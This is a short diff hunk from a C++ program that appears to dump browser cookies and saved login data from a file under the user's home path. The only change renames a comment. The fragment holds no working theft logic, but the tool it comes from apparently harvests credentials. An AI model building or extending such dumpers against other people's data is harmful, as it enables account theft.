@@ -28,7 +28,7 @@ int main() {
     CookieDumper.Show();
     std::cout << std::endl;
 
-    // Dump LoginInfo
+    // Dump LoginData
     LOGIN_DUMPER LoginDumper;
     std::string LOGIN_DATA_FILE =
         HOMEPATH +
